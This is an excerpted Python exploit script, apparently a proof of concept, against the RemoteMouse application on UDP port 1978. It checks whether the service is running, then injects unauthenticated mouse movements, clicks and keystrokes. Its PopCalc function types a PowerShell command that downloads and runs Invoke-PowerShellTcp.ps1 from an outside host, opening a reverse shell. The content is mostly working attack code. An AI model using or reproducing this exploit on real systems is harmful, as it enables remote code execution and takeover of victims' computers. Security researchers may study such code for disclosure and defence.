...
def Ping(ip):
    try:
        ...
        responseInBytes=target.recv(1048)
        target.close()
        responseAsString = responseInBytes.decode('UTF-8')
        if responseAsString=='SIN 15win nop nop 300':
            print("RemoteMouse is running on the target.")
            return True
        else: return False
    except:
...
def MoveMouse(x,y,ip):
    def SendMouse(command,times,ip):
        for x in range(times):
            ...
            commandString=command.encode('UTF-8')
            target.sendto(commandString,(ip,1978))
            sleep(0.001)
    if x>0:
        command="mos  5m 1 0"
...
def MousePress(command,ip,action="click"):
    if action=="down":
        ...
        target = socket(AF_INET, SOCK_DGRAM)
        commandString=command.encode('UTF-8')
        target.sendto((commandString+b" d"),(ip,1978))
        target.sendto((commandString+b" u"),(ip,1978))
...
def SendString(string,ip):
    for char in string:
        target = socket(AF_INET, SOCK_DGRAM)
        charByte = characters[char].encode('UTF-8')
        target.sendto(charByte,(ip,1978))
        sleep(0.5)
...
def PopCalc(ip):
    ...
    sleep(1)
    SendString("cmd.exe /c powershell IEX (New-Object Net.WebClient).DownloadString('http://<ip>/Invoke-PowerShellTcp.ps1')",ip)
    sleep(1)
    SendString("\n",ip)
    print("Command was transferred and executed.",ip)
